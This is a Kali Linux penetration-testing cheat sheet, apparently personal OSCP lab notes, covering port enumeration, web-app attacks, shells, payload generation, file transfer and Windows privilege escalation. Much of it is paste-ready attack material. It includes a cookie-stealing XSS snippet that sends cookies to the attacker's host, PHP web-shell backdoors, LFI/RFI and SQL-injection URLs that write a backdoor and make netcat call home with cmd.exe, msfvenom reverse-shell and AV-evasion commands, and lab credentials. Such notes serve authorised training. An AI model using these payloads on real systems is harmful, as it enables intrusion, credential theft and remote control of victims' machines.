# Kali Linux Pen Testing Pastable

A Pastables File: A quick reference sheet to cut and paste from.

## MISC

### IRC Joining up with OffSec Team

`/msg NickServ IDENTIFY <password>`

`/join #offsec`

### How to "save" the IP Address of a target and pass it in CLI

`export tgt=<targets IP>` and then test it, `echo $tgt`

Save the attack IP box

`export me=<kali box ip>`

### tar (compression ops) commands

`tar -czf target.tar tardir` Remember as "tar *c*ompress *z*ee *f*iles!

`tar xzf target.tar` can be remembered as "tar *x*pand *z*ee *f*ile!

tar up the root folder (c: create,f: file, j: compress bzip, p: preserve permissions, v: verbose)

`tar -cfjpv root.tar.gz /root/`

untar the root folder (x: extract, j: bzip, p: preserve, v: verbose)

`tar -xvf ./rootfolder.tar.gz --overwrite --directory /`

Untar a tar.gz file

`tar xvzf archive.tar.gz`

packages used below that may not be included by default in Kali

`apt-get install seclists gobuster`

### 2019.4 Setting up Non-Root Kali

Running dual user setup. Better security to run as reg user and upgrade as needed. Also allows Vscode to work.

From the root account:
1. `useradd -d /home/newuser/ -m -s /bin/bash newuser`
2. `usermod -aG sudo newuser`
3. `passwd newuser`

Login as the new user and run Sparta as root:
1. `sudo xhost +`
2. `sudo su root`
3. `sparta`
4. When done `xhost -`

Running as root and downgrading to reg user to run FireFox
1. `xhost +`
2. `su newuser -c firefox`
3. `xhost -`

Setting Up Git
1. `git config --global user.name "username"`
2. `git config --global user.email "123455-the-no-reply-email-from-git"`

### Setting up Non-Root Kali (Older versions)

#### To Run in Completely Different User Account

1. Get in an set up non root user in Kali
2. set passwd
3. add to sudo
4. cp /root/ to /home/user1
5. add to wireshark group
6. log back in as user1

Setting up a non-root user (wireshark and other risky things)

1. Add a user `adduser <something>`.
2. Add them to Wireshark Group `usermod -aG wireshark <something>`.
3. Set their password `passwd <something>`

[To fix things like Sparta GUI breaking](https://github.com/P0cL4bs/WiFi-Pumpkin/issues/53)

It will tell you to:

`export QT_X11_NO_MITSHM=1` will temporarily fix it.

To permanently fix `echo "QT_X11_NO_MITSHM=1" >> /etc/environment`

### To Ease Access To the Xhost Server

Give up control on xhost

`xhost +`

Give it back when done

`xhost -`

Execute as the <something>

`su <something>` then at the new prompt, `wireshark`

## Text Manipulation

Replace newline with a comma

`tr "\n" ","`

## Enumeration

Objectives:
1. TCP and UDP Ports
2. What Services the Ports are actually offering
3. OS and Version
4. Machine's Role
5. Web Server Version
6. Web Application version
    - Web Application Attacks are a separate process below
7. Vulnerabilities
8. Default Creds for all the things
    - In short look for the way in....

[0 Day Security Guide to Enumeration](http://www.0daysecurity.com/penetration-testing/enumeration.html) - Fantastic and covers a lot of services.

### PORT SCANNING (All ports for both TCP/UDP)

Nmap is great for the TCP Stack and partial scan of UDP stack.  For the UDP stack masscan or unicorn scan works well.

#### Nmap staged scanning (Example; not law)

The idea is to discover the role of the target and what is open in stages instead of immediately throwing the kitchen sink at it.

1. First pass `nmap -T4 -n -v $tgt -oA defScan-"$tgt"`
2. All tcp ports `nmap -sT -T4 -n -v -p- $tgt -oA tcpAll-"$tgt"`
3. Top 100 UDP `nmap -sU -T4 -n -v --top-ports 100 $tgt -oA UDP100-"$tgt"`
4. Banner Grab of known TCP ports `nmap -sT -T4 -n -v -sV -p<open ports> $tgt -oA TCPServices-"$tgt"`
5. Service Scripts etc. `nmap -sT -T4 -n -v -sV -sC -p<open ports> $tgt -oA TCPScripts-"$tgt"`
6. Now the UDP side `nmap -sU -T4 -n -v -sV -sC -p<open ports> $tgt -oA UDPScripts-"$tgt"`

#### Masscan to find the ports and Nmap to enumerate the open ones

Examples of both stacks with masscan

`masscan -p1-65535,U:1-65535 $tgt --rate=800 --wait 30 -e tun0 |tee masscan-all-tcp-and-udp.out`

See the results of TCP results and send to a file

`cat masscan-all-tcp-and-udp.out | grep tcp| awk '{print $4}'| cut -d / -f1 |sort -n > tcp-ports`

See the results of UDP results and send to a file

`cat masscan-all-tcp-and-udp.out | grep udp| awk '{print $4}'| cut -d / -f1 |sort -n > udp-ports`

Now do narrowed scans of the TCP ports open on the target with nmap

`nmap -v -n --reason -p <TCP Ports> -O -sT -sC -sV $tgt -oA services-tcp`

Narrowed scan of UDP ports open on the target

`nmap -v -n --reason -p <UDP Ports> -sU -sC -sV $tgt -oA services-udp`

#### Unicorn Scan and Nmap

1. `unicornscan -i tap0 $tgt:a`
2. `unicornscan -i tap0 -m U $tgt:a`
3. `nmap -sU --script=snmp-info.nse -p 161 $tgt`
4. `nmap -T5 -p- $tgt -oA Verify`
5. `nmap -sC -v -n --reason -T5 -p 21,80,3389 $tgt -oA serviceScritps`
6. `nmap -sV -v -n --reason -T5 -p 21,80,3389 $tgt -oA serviceVersions`

### Manual Banner Grabbing

Connect to the target port of suspected web server

1. `nc -nv $tgt 80`
2. `GET / HTTP/1.1`
3. `HEAD / HTTP/1.1`

One liner: `echo -e "HEAD / HTTP/1.1 \r" |nc -nvv $tgt 80`

What about 443????

`openssl s_client -connect $tgt:443`

#### netcat cycle through ports.... poorman's scanner. It outputs in stderr so

`nc -nvv -w 1 -z $tgt 1-65535 2>&1 | tee nc_scan.txt`

## Break Down of Recon Per Port/Service

Example of finding an nmap script and learning how to use it. Example smtp: `ls /usr/share/nmap/scripts/*smtp*`

See what you want and most likely the author explains how to use it: `less /usr/share/nmap/scripts/smtp-enum-users.nse`

### 21- ftp

Look for: OS version, FTP Version, misconfigured permissions (whole hd?)

- `ftp $tgt`
- `nc -nvv $tgt 21`

There are nmap scripts to do this for you

`nmap --script=`

### 22 - ssh

Look for: SSH Version (hint at OS?)

- `ssh root@$tgt`
- `nc -nvv $tgt 22`
- `nmap --script=`

### 23 - telnet

Look for: Version (hint at OS?)

- `telnet root@$tgt`
- `nmap --script=`

### 25 - smtp

Look for Version, User enumeration

- One at a time `echo -e "VRFY root \r" | nc -nv 10.11.1.215 25`
- A list at a time: `for name in $(cat userlist.txt); do echo -e "VRFY root \r" | nc -nv $tgt 25; done`
- `nmap --script=/usr/share/nmap/scripts/smtp-enum-users.nse`

### 53 - DNS

Look for: Version (hint at OS and infrastructure), Zone XFR

### 80 - http

**Enumeration Only; Web App Attacks Later in Guide**

[SEC LISTS](https://github.com/danielmiessler/SecLists.git) or `apt-get install seclists`

Look for:
- Webserver version (Apache 2.34 etc.) **AND** Web Application Version (WordPress?)
	- OS Type and Version
	- Application Type and Version
	- Server date time
	- Options allowed
	- Code it is running? It it Server or Client Side code: PHP | Java | APX?

Identify the HTTP Server Version
- One liner netcat banner grab `echo -e "HEAD / HTTP/1.1 \r" |nc -nvv $tgt 80 | tee banner.txt`
- Curl just the headers: `curl -I http://$tgt:80/ |tee headers.txt`
- Msfconsole
	1. use auxiliary/scanner/http/http_version
	2. set RHOSTS $tgt
	3. run

Identify the Web Application
- Web App Vuln Scanner: `nikto -host $tgt -port $tgtPort`

Identify Both the Application and the Server
- Application Mapper `amap $tgt 80`
- View the page and look for information leakage
	- Curl it `curl -v http://$tgt/webpage | tee webpage.curl`
	- wget it `wget “http://$tgt/index”`
	- CLI Graphical Browser `browsh --startup-url $tgt` and `CTRL + q` to quit
	- Lynx, a highly effecient CLI text browser `lynx http://$tgt`

#### Mapping of Directories

MSFConsole
- use auxiliary/scanner/http/brute_dirs
- set RHOSTS $tgt
- run

Dirbuster
- Use MSF Dir List with dirb `dirb http://$tgt /usr/share/metasploit-framework/data/wordlists/directory.txt`
- Start crawling the site for Directories: `dirb http://$tgt/ |-o dirb-$portNum.out`
- Now check for files and end points: `dirb http://$tgt/ -X .htm,.html,.php |tee dirb-$portNum-files.out`

Go Buster (Another Dir Buster)
- `gobuster -w SecLists/Discovery/Web_Content/big.txt -u http://$tgt/`
- `gobuster -w SecLists/Discovery/Web_Content/raft-large-files.txt -u http://$tgt`
- `gobuster dir -u "http://$tgt/" -w /usr/share/wordlists/dirb/common.txt -s '200,204,301,302,307,403,500' -e |tee gobuster-dir-80.out`

#### Mapping of Pages

Confirm hidden pages
- CGI's are gold here

`gobuster -u http://$tgt/ -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s '200,204,403' -e`

#### Check Robots.txt

MSFConsole
1. use auxiliary/scanner/http/robots_txt
2. set RHOSTS 192.30.247.3
3. run

Manually with curl `curl http://$tgt/robots.txt |tee robots.txt`

### 135 - RPC

See what remote clients can interact with

`showmount -e $tgt`

### 139 - Netbios


### 161 - snmp
Look for:  If this pops it dumps a TON of OS info and user info

Can also allow you to WRITE configs into the device... looking at you Cisco

snnpwalk ???
snmpcheck ???
nmap --script=

### 443 - ssl
openssl s_client -connect $tgt:443

### 445 SMB
What can we mount unathenticated with Null Sessions?

Do we have creds to enum that users shares?

#### Check null
smbclient -L \\\\$tgt -N

#### Mount Up...

`smbclient ////TARGET/Backups -I $tgt -N`

or

`mount -t cifs //$tgt ip/Backups /media/ -o username=NULL`

### 1433 - SQL

`nmap -p 1433 --script ms-sql-info --script-args mssql.instance-port=1433 $tgt`

To interact with the DB directly.  Default Admin name is SA.
- Install Impacket: [Impacket Github](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)
- `mssqlclient.py -p 1433 -db DMBNAME -windows-auth USER@10.10.10.10`

[SQLI Guide by Travis Altman](http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/)

List all DB: `SELECT name FROM master..sysdatabases;`

See columns for a table: `SELECT * FROM information_schema.columns WHERE table_name='master'`

Determine current DB: `SELECT DB_NAME();`

Dump Admin Users: `select loginname from syslogins where sysadmin = 1`

Dump usernames and hashes: `select name, password_hash FROM master.sys.sql_logins`

### 3000 JWT QUERY API

Confirm what it is powered by

`curl -I http://$tgt:3000/`

Move on to JWT Attacks below

## Follow On Enumeration

### Enum4linux is a wrapper around rpcclient, net, nmblookup and smbclient

enum4linux -a -v $tgt |tee enum4linux-a-v.out

********************************************************
Scanning Misc.
********************************************************

#snmp-check- mad loot if the target offers snmp with a public string
snmp-check $tgt

snmpwalk -v 1 -c public $tgt

#look at users with sessions open on target; look for the <03> flag
nmblookup -A $tgt

#Enum Null Sessions Share; On a certain box... here was one of the <03> flags
smbclient -L //<machine name> -I $tgt -N

#Connect to //[name of <03>]/[name of share]
smbclient //<machine name>/wwwroot -I $tgt -N

nbtscan 10.11.1.1-254

#null session enum
rpcclient -U "" $tgt
>srvinfo
>enumdomusers
>getdompwinfo

#enum4linux does the above rpcclient checks
enum4linux -a -v $tgt |tee enum4linux-a-v.out

nmap -p 139,445 --script s,b-enum-users $tgt

unicornscan -i tap0 -E -m U $tgt:a > unicornUDPfull

******************

## WEB APP Testing

**Goals**:
1. Web Server Software/Version
2. Web Application Software/Version
3. SQLI?
4. Vulns

LOOK UP AND TRY DEFAULT CREDS!!!

Good, quick and dirty enum: `curl -i http://$tgt:80/`

Initial Sweep of the website (Directory Busting): `gobuster dir -u "http://$tgt/" -w /usr/share/wordlists/dirb/common.txt -s '200,204,301,302,307,403,500' -e |tee gobuster-dir-80.out`

Confirm hidden pages: `gobuster -u http://$tgt/ -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s '200,204,403' -e`

### wfuzz taken from pentesterlab.com sqli to shell

|Switch|Function|
|---|---|
|-c|Output with colors|
|-z|Wordlist file|
|-hc 404|Ignore 404's|
|FUZZ|Tells Wfuzz where in the URL to fuzz/brute|

`python wfuzz.py -c -z file,wordlist/general/big.txt --hc 404 http://vulnerable/FUZZ`

wfuzz to detect php on the server
```bash
python wfuzz.py -z file -f commons.txt --hc 404 http://vulnerable/FUZZ.php
```
### JWT (Java Web Token)Attacks

Try to auth with JWT with curl:
```bash
curl -H 'Accept: application/json' -H "Authorization: Bearer ${TOKEN}" https://{hostname}/api/myresource
```
```bash
curl -H 'Accept: application/json' -H "Authorization: Bearer ${token}" http://$tgt:3000/users/
```

### Helpful Code Snippets

Standard check for XSS vulnerability
```java
<script>alert("XSS")</script>
```

Iframe Injection
```html
<iframe SRC="http://$me/report" height = "0" width ="0"></iframe>
```

Grab a cookie....
```java
<script>
new Image().src="http://$me:81/bogus.php?output="+document.cookie;
</script>
```

### Backdoor One Liners

Standard quick and dirty php shell
```php
<?php echo shell_exec($_GET['cmd']);?>
```

LANG=../../../../../../../xampp/apache/logs/access.log%00

### LFI and RFI

LFI Move nc.exe to target:

`$tgt/addguestbook.php?name=badDude&comment=pwnU&cmd=tftp%20-i%20$me%20get%20nc.exe&LANG=../apache/logs/access.log%00`

LFI Have nc.exe to call home:

`http://$tgt/addguestbook.php?name=badDude&comment=pwnU&cmd=nc%20-nv%20$me%20443%20-e%20cmd.exe&LANG=../apache/logs/access.log%00`

RFI to Move nc.exe to target:

`http://$tgt/addguestbook.php?name=badDude&comment=pwnU&LANG=http://$me/evil.txt%00`

RFI to have nc.exe call home:

`http://$tgt/addguestbook.php?name=badDude&comment=pwnU&LANG=http://$me/evil.txt%00`

LFI vs RFI Command Input:
1. LFI will execute the CMD found in the command line; enabled by the php 'cmd' variable injected into the logs
2. RFI will execute the CMD found in the "evil.txt" found in the evil.txt hosted on the attack machine

### JSON / JQUERY Rest API on port 3000...  

Find what its powered by.... Probably Express... see if the Response Headers are there as a tab

`curl -I http://$tgt:3000/`

### WORDPRESS

Default Creds Admin:Admin

location of passwords: /var/www/wordpress/wp-config.php

#### WP Scanner
??

### DEF CREDS - Try font door anytime you find it
Wordpress
- admin:admin

vsFTPd 2.3.4
- anonymous:\*blank\*

ORACLE isql
- SYSTEM:SYSTEM

### Default Usernames and Passwords Sites

[CIRT](http://www.cirt.net/passwords)

[Government Security - Default Logins and Passwords for Networked Devices](http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php)

[Virus.org](http://www.virus.org/default-password/)

[Default Password](http://www.defaultpassword.com/)

### SQL Injection

[SQLI Guide by Travis Altman](http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/)

## SHELLS

nc shell upgrade to /bin/bash/

`python -c "import pty;pty.spawn('/bin/bash');"`

Py3

`python3 -c "import pty;pty.spawn('/bin/bash');"`

PHP

`<?php echo shell_exec($_GET['cmd']);?>`


============================================================================================
					            MSF VENOM
============================================================================================
A great cheat sheet: https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/

# List payloads
msfvenom -l

#Encoding payloads
msfvenom -p <Payload> -e <encoder> -f <format> -i <encode count> LHOST=$me LPORT=$mePort

# Examples from Thor-Sec:

#Handler Setup
#Meterpreter
msfconsole -q
use exploit/multi/handler
set PAYLOAD <PAYLOAD>
set LHOST <IP>
set LPORT <IP>
set ExitOnSession false
exploit -j -z

# Netcat
nc -nlvp <PORT>

# Linux--------------------
# Reverse Shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf

# Bind Shell
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f elf > shell.elf

# Windows------------------
Reverse Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe

Bind Shell
msfvenom -p windows/meterpreter/bind_tcp RHOST= <IP> LPORT=<PORT> -f exe > shell.exe

CMD Shell
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe

User Creation
msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe

# Mac ----------------------
Reverse Shell
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f macho > shell.macho

# Bind Shell
msfvenom -p osx/x86/shell_bind_tcp RHOST=<IP> LPORT=<PORT> -f macho > shell.macho

# Web Payloads-------------------
# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war

# Scripting Payloads
# Python
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl

---------------------------------A/V EVASION-----------------------------------------------
# Inject payload into a legit file

# Veil evasion

# ? what else?

# MSF5 Evasion Payloads

----------------------------------- More Advanced Venom Examples --------------------------------------------
#  Exit THREAD instead of a Process to leave a door open (example bind shell)

msfvenom -p linux/x86/meterpreter_reverse_tcp -f elf LHOST=$me LPORT=9835 > linuxmetrpr.elf

msfvenom -p linux/x86/shell_reverse_tcp -f elf LHOST=$me LPORT=443 > nonstaged.elf

msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$me LPORT=443 > metrev443.elf

msfvenom -p linux/x86/shell_reverse_tcp -f c -b "\x00\x0a\x0d" LHOST=$me LPORT=9874 EXITFUNC=thread

#inject a payload into an PE
msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x ./plink.exe -o plinkevil443.exe

msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f jsp > rev443.jsp

msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f asp > shellrev443.asp

msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shellrev443.exe

msfvenom -p windows/meterpreter/reverse_http LHOST=$me LPORT=80 -f exe -e x86/shikata_ga_nai -i 14 -o metrevhttp80.exe

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$me LPORT=53 -f exe -e x86/shikata_ga_nai -i 9 -o metrev53.exe

============================================================================================
					POSH For PenTesters (Notes From PenTester Academy)
============================================================================================
# Enumerate HotFixes
Get-HotFixes

============================================================================================
					WINDOWS COMMAND LINE STUFF
============================================================================================
# GREAT Source for WMIC Commands!
https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4

#Show networked drives
net share

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

c:\windows\system32\cmd.exe

netstat -ano

tasklist /svc

tasklist /svc > svclist.txt

schtasks /query /fo LIST /v

net start

DRIVERQUERY

netsh firewall show opmode

netsh firewall set opmode enable

netsh firewall add portopening TCP 80 HTTP enable subnet

dir "C:\Documents and Settings"

systeminfo

net user John fadf24as /ADD

net localgroup administrators John /add

whoami /priv
	/groups
	/user

#Windowsxp
echo %username%

#Disable MPP
netsh int tcp set security mpp=disabled



bootcfg /raw "/noexecute=alwaysoff"

============================================================================================
				INTERNAL ENUMERATION
		Goals: understand who, what, where, when, Why
			Remember: Check, Collect, Clean
============================================================================================

1. Who else is on right now?
Linux: w
Windows: query user		remotely: query user /server:computername

2. Who has been on?
Linux: last
Windows: ?

3. What has this box been talking to?
Linux: arp -e, check ssh known_hosts
Windows: arp /all, check ssh known_hosts

4. What is this box able to talk to?
Linux: route print, ip addr
Windows: route print, ipconfig


==========================================================================================
			     SQLI
	Goals: Enumerate DB's; Find Creds and or rain shells.
		 Test it, Map it, Steal it....
==========================================================================================
#From pentesterlab.com:
# retrieve information using the SELECT statement;
# update information using the UPDATE statement;
# add new information using the INSERT statement;
# delete information using the DELETE statement.
# Asterisk * is WILDCARD

#SELECT columnsYouWant FROM tablesYouWant WHERE informationMatchesWhatYouWant
#Example: SELECT column1, column2, column3 FROM table1 WHERE column4='user' AND column5=3 AND column6=4;
# will retrieve from the following table:
#column1	column2		column3		column4		column5		column6
# 1			test		Paul		user			3		   13
# 2			test1		Robert		user			3		   4
# 3			test33		Super		user			3		   4
# the following info:
#column1	column2		column3
#	2		 test1		Robert
#	3		 test33		 Super
# Note Row 1 wasn't selected because of what was matched in Column 6.
# Only the first 3 columns were selected because of the query

**********************************TESTING IT*************************************
Goals:
1. Find out if it is sending unfiltered data to the db
2. How is it reading inputs
Testing for a vulnerability-
IOW see if it breaks- if it does it is passing stuff directly to the back-end :-)
********************************************************************************
#Does it do math; 2-1 shows article 1
/article.php?id=2-1

#Does it look for stings?
#a ' break the backend query by passing the ' as 's are used for strings in an SQL Query
/article.php?id=1'      (added a ' to the end)

#PROPER EXAMPLES OF SQL WE ARE TRYING TO BREAK (What is under the hood):
#SELECT id,name FROM users where name='test' and id=3;
#or
#SELECT id,name FROM users where ( name='test' and id=3 );
#If for example the injection point is at the word test we can try and break it with
#odd numbers of ' or ( or ) OR adding comment delimiters to break the query such as -- or # or */

#Does it break? Add a ' to the end of the line
http://$tgt/comment.php?id=738'

******************************* MAPPING IT *************************************
Goals:
1. How many columns?
2. Find the 'viewport'... where can we make data appear?
3. Columns and table names?
********************************************************************************
# How many columns are being pushed to the page?
# Columns Discovery: first instance of a break it is 1 too high.
http://$tgt/comment.php?id=738 order by 7 #if it breaks at 7 there are 6 columns

#Weld attacking request with victims. Keep it balanced...
union all select

#Map the columns to their data.  Look for a column that lends to easy Data display... like the comments column
http://$tgt/comment.php?id=738 union all select @@version,2,3,4,5,6
# then 1,@@version,3,4..... then 1,2,@@version,4 (moving it until it shows up- thats your 'viewport')

#Mysql commands handy to inject:
#Current user logged in?
user()
current_user()
#Version
version()
@@version
#current DB
database()

# Map the names of tables... looking for something juicy like users etc. (Column 5 is the 'viewport')
http://$tgt/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables
table_name,6 FROM information_schema.tables

# Map the columns of a particular table... for example users.
http://$tgt/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'

# Or from pentesterlab... a more organized method.
1 UNION SELECT 1, table_name, column_name,4 FROM information_schema.columns

# But wait... the window is only 1 column? concat them!
1 UNION SELECT 1,concat(table_name,':', column_name),3,4 FROM information_schema.columns

#Your desired info is probably near the end as the first load of tables are for MySQL itself.

**********************QUICK KILL ADMIN LOGIN**************************
# Authentication Bypass
# This essentially selects the first line of users.  If its an admin
# it may log yo in as admin. Place this into the name input box if Admin is the first.
wronguser' or 1=1 LIMIT 1;#

# The SQL SELECT LIMIT statement is used to retrieve records from one or more tables in
# a database and limit the number of records returned based on a limit value.
# TIP: SELECT LIMIT is not supported in all SQL databases. For databases such as SQL Server
# or MSAccess, use the SELECT TOP statement to limit your results.

# Going for the kill... Attempt to extract usernames and passwords Note 0x3a = ':'
http://$tgt/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users
0x3a is ':'

# To read the contents of a file on target server file system
http://$tgt/comment.php?id=-1 union select all 1,2,3,4,load_file(‘c:/windows/system32/drivers/etc/hosts’),6

# Writing to a file on the Servers File System
http://$tgt/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'

# Using the created backdoor to call home:
http://$tgt/backdoor.php?cmd=nc -n $me 443 -e cmd.exe

# Blind SQL Injection using the sleep function   if the server sleeps it indicates it might be SQLi Vulnerable
http://$tgt/comment.php?id=738-sleep(5)

# To check sql version via blind SQLi timing method... if version is equal to X then sleep 5
http://$tgt/comment.php?id=738-sleep(5)-IF(MID(@@version,1,1)='5', SLEEP(5), 0)

# Shell via dropdown Post Parameter... AKA Proxy attack
Lang=  'union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor4.php

So far..
' UNION SELECT 1,2,3,4,@@version,6 #
^                                  ^
First breaks and drops            Terminator prevents raising us back up since there is a hidden '


Investigate further......  Why the #?  DRAW THIS OUT!!!!
'union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor7.php
^                                                                                 ^                             ^
|---------------------------------------------------------------------------------|-----------------------------|
First one breaks it.                                      This one encases the file string...              We dont terminate this one because we need the hidden ' =OR= use '#


The whole key here is figuring out if there is a hidden ' at the end of the input box and where else we need a ' ... for example we need a ' encasing around the file destination

++++++++SQLMAP++++++++++++++

sqlmap -u $tgt --crawl=1

sqlmap -u $tgt/discoveredinjectpoint.php?id=738 --dbms=mysql --dump --threads=5

sqlmap -u $tgt/discoveredinjectpoint.php?id=738 --dbms=mysql --os-shell

--cookie="security=low; PHPSESSID=oikbs8qcic2omf5gnd09kihsm7"

--headers="User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0" --cookie="security=low; PHPSESSID=oikbs8qcic2omf5gnd09kihsm7" -u 'http://localhost/dvwa/vulnerabilities/
sqli_blind/?id=1-BR&Submit=Submit#' --level=5 risk=3 -p id


++++++sqlmap progressive++++++++  POST DATA
#What are we dealing with?
sqlmap - u $tgt/url --dbms=mysql --forms --banner

#Who are the DB users.... not user data but the users administering the DB
sqlmap - u $tgt/url --dbms=mysql --forms --banner --users

#Get those users? passwords?
sqlmap - u $tgt/url --dbms=mysql --forms --banner --users --passwords

#Enumerate the server and its DB that the user has access to
sqlmap - u $tgt/url --dbms=mysql --forms --banner --dbs

#Enumerate a particular DB
sqlmap - u $tgt/url --dbms=mysql --forms --banner -D $targetDB

#What are the Tables?
sqlmap - u $tgt/url --dbms=mysql --forms --banner -D $targetDB --tables

#what are the columns?
sqlmap - u $tgt/url --dbms=mysql --forms --banner -D $targetDB -T $tgttable --columns

#Target the columns you want
sqlmap - u $tgt/url --dbms=mysql --forms --banner -D $targetDB -T $tgttable -C name,of,columns --dump

#levels 1-5- Default 1. Controls the numbers of payloads it tries.  For example, user agents, cookies etc. it starts attacking all of them.

#Risk 1-3- The higher the number the riskier the attack.  A higher level of risk could corrupt and crash the database.

#--technique= manually select the type of attack. Specify which one you know works to save time.

sqlmap -u http://$tgt/ --crawl=20 --threads=5 --forms --batch --dbms=mysql --dbs  

PAYDAY EXERCISE
csid =  ' AND SLEEP(5) #
' AND SLEEP(5) AND 'TSXP'='TSXP&redirect_url=index.php&user_login=ncri&password=

==========================================================================================
					ORACLE DB
==========================================================================================
http://oracleserver:port/pls/simpledad?admin_/globalsettings.htm

select * from v$version

select * from global_name

select table_name FROM all_tables;

select owner, table_name FROM all_tables;

SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';

SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';

SELECT column_name FROM all_tab_columns WHERE table_name = 'USER$' and owner = 'SYS';

============================================================================================
					FILE TRANSFER  Goals: Upload tools to expand access
					Remember: To avoid AV it is best to use legit Admin tools.
============================================================================================
# DUMMY ACCOUNT - Lets not leave our creds for root on the victim machine
# thedude:!thedudeabides!$ 


Simple Python Server:
python -m SimpleHTTPServer 8080

nc shell upgrade to /bin/bash/
python -c "import pty;pty.spawn('/bin/bash');"


# WGETVBS
cscript wget.vbs http://$me/scsiaccess.exe scsiaccess.exe
                 http://   $tgt    /<source>       <destin>

# PUREFTP:
run script
OR
user: offsec
pass: labL@B123

# TFTP:
ATTACKER:	atftpd --daemon --port 69 /tftp
VICTIM: 	tftp -i $me get nc.exe

# On the other hand if you are on the computer wanting to receive file from a remote computer:
scp username@remote:/file/to/send /where/to/put

# If you are on the computer from which you want to send file to a remote computer:
scp /file/to/send username@remote:/where/to/put
scp ./authorized_keys thedude@$me:/tmp/

ssh-keygen -R [hostname]

# prep and SMB server
smbserver.py ED209 /root/labs/31ralph

# on the victim tranfer a file via SMB
net view \\$tgt

# move, dir, or copy
dir \\$me\ED209
# Copy to the drive
Copy file.txt \\$me\ED209\

# Copy FROM the drive
copy \\$me\ED209\file.txt .

# Run it via SMB
\\$me\ROPNOP\meterpreter.exe

============================================================================================
			Fun with SSH
============================================================================================

============================================================================================
				COMPILING
============================================================================================

GCC Compile 32 bit on x64:
sudo apt-get install gcc-multilib      <-- These installed first

# Ming - Cross Compiler for Windows


==========================================================================================
				PRIV ESC
==========================================================================================
---------WINDOWS-----------------------------------
Great script to get started with is PowerUP:
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
PowerUP is only a decent start - and it doesn't find everything...

March 19 Update of most common windows PrivEsc Paths:

1. command histories
2. DLL Hijack
3. Service Hijacking


1. Command histories
doskey /history

2. DLL Hijacks
- DLL Load order
- Missing DLLs (For example the office fax.dll)

Use ProcMon to find phantom DLLs and set it to filter for create file; return code for Not Success- then show results for NAME NOT FOUND
Make Proxie DLLs if you want to keep the program from crashing

Check for folders such as C:\Program Files\ for "Create Files" or "Append Data" permissions - allows users to install anything or add DLL's

3. Service Hijacking
# If you can write to a dir that a service calls a dll from you win...
# HKLM/System/CurrentControlSet/Services
# If you can set a value or a subkey on any of these you are going to be system soon
--------------------------------------------------------------------------
Source: https://toshellandback.com/2015/11/24/ms-priv-esc/

# Unquoted Winddows Services... quick win!
# In short - if a dev creates a service and fails to enclose the service path in quotes
# it will try each word prior to a space as a separate file.  Example:
# C:\Program Files\Some Folder\Service.exe
# It will try: C:\Program.exe; C:\Program Files\Some.exe; C:\Program Files\Some Folder\Service.exe
# The goal here is write a malicious payload into one of those spots...

# Locate such a service
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

# icacls will tell you if you have permissions to write there....
# Example of a service identified with wmic- C:\Program Files (x86)\Privacyware\Privatefirewall 7.0\pfsvc.exe
icacls "C:\Program Files (x86)\Privacyware"

# BUILTIN\Users:(OI)(CI)(M) <--- the M means modifiable

# Drop a payload of the same name
msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o Privatefirewall.exe

